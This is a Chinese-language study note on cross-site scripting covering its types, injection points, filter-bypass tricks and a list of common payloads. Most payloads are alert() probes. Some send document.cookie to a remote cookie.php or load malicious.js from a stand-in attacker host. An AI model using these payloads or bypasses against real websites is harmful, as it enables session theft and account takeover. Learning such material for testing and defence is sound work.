#                                  XSS

* ## XSS定义

跨站脚本（Cross-site scripting，XSS）是对网页代码（包含HTML以及前端脚本）有漏洞的网站进行的攻击，是代码注入的一种。它允许恶意代码被注入到网页上，其他使用者在访问网页时就会受
到影响。攻击成功后，攻击者可能得 到更高的权限、私密网页内容、会话和cookie等各种内容。 

> 提示
>
> > XSS属于客户端攻击，受害者最终是用户。但不要忘记网站管理人员也属于用户之一，管理员拥有着太多权限，一般管理员都可以对网站进行文件管理、数据管理等操作，攻击者就有可能靠管理员身份作为跳板实施攻击。

* ## 原理

  XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般使用JavaScript语言编写JavaScript可以用来获取用户的Cookie、改变网页内容、URL调转，存在XSS漏洞的网站，可以盗取用户Cookie、黑掉页面、导航到恶意网站，攻击者仅仅需要向web页面注入JavaScript代码

* ## 分类

  1. 反射型（不储存于服务器，非持久）
  2. 储存性（粗存于服务器，持久性）
  3. DOM型（改变DOM结构）（DOM本身代表文档，给予DOM型的XSS不需要与服务器交互，只发生在客户端处理数据阶段）![image-20201229221502057](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20201229221502057.png)

- ## 漏洞利用

 1.盗取cookie： 

```
<script>alert(document.cookie)</script>
```

 2.构造页面跳转： 

```
<script>location='https://www.hacker.com'</script>
```

 3.构造获取cookie并发送到远程主机： 

```
<script>document.location='http://127.0.0.1/test/cookie.phpcookie='+document.cookie</script>
```

- ### 常见注入点

1、输入框

2、留言板

3、URL中可传参数的变量

* ### 触发JS解析器的方式：

  1. 直接嵌入<script>代码块。

  2. 通过src属性加载代码。
  3. 各种HTML CSS参数支持JavaScript：URL伪协议触发调用。
  4. 事件处理器，如：onload，onerror，onclick等。
  5. 定时器，timer（setTimeout，setInterval）
  6. eval(...)调用

* ## 过滤与绕过

  #### 1. 闭合引号、标签

  #### 2. 关键字过滤

  > 大小写
  >
  > 双写、拼凑
  >
  > 干扰字符（任意位置插入null字符）
  >
  > ```javascript
  > <im[%00]g onerror=alert(xss) src=a>
  > ```

  #### 3. 编码绕过

  * url编码，JavaScript编码  （在src等属性标签下可用，”JavaScript“不能编码）

    |     进制      |       格式       |
    | :-----------: | :--------------: |
    |  ascll(默认)  |       %00        |
    |    八进制     | \0(三位不足补零) |
    |    十六进     |       \x00       |
    | unicode编码制 |      \u0000      |

  * HTML实体（对大小写敏感）

    [html实体码转码](https://www.qqxiuzi.cn/bianma/zifushiti.php "实体码，记得预留字符转命名实体")

    ![image-20201229232607711](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20201229232607711.png)

  

  * 宽字节绕过
  * 复合编码

  * 单引号   ()   --->   ``

  #### 4. 外部标签

  > ---> <svg>属于外部标签，是一种特殊的标签，它使用XML格式定义图像，XML支持在标签内解析HTML实体字符，所以在XML中可以执行。

  ```html
  <svg><script>alert(&#40;'1'&#41;</script>)
  ```

  ##### 浏览器解码顺序

  html解码 ---> JavaScript解码 ---> url解码 ---> 发送http请求

  ![image-20201229223632254](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20201229223632254.png)

  #### 4. JavaScript转义

  ```
  eval()
  ```

  * ## 常用payload

   **script标签：** 

  ```
  <script>alert(/1/)</script>
  <script>prompt(1)</script> 
  <script>confirm(1)</script>
  <script src="http://attacker.org/malicious.js"></script>
  <script src=data:text/javascript,alert(1)></script>
  <script>setTimeout(alert(1),0)</script>
  ```

   **img标签：** 

  ```
  <img src=x onerror=alert(1)>
  <img src=x onerror=prompt(1);>
  <img src=javascript:alert('1')>
  ```

   **a标签：** 

  ```
  <a href=”javascript:alert(1)”>点击触发</a>
  <a href="http://www.hacker.com">点击触发</a>
  ```

   **iframe标签：** 

  ```
  <iframe src="javascript:alert(1)">
  <iframe onload=alert(1)>
  ```

   **常用事件：** 

  ```
  onclick: 点击触发 
  （<img src=x onclick=alert(1)>）
  ```

  ```
  onerror: 当 src 加载不出来时触发 
  （<img src=x onerror=alert(1)>）
  ```

  ```
  onload: 当 src 加载完毕触发
  （<img src=x onload=alert(1)>）
  ```

  ```
  onmouseover：鼠标移动到图片后触发
  （<img src=x onmouseover=alert(1)>）
  ```

  ```
  onmousemove: 鼠标移到指定元素触发
  （<img src=x onmousemove=alert(1) >）
  ```

  ```
  onfocus: 当input 输入框获取焦点时触发
  （<input onfocus=javascript:alert(1) autofocus>）
  ```

  **常用属性：**
  src
  action
  href
  data
  content 

  **javascript弹窗函数：**
  alert()
  confirm()
  prompt() 

  





















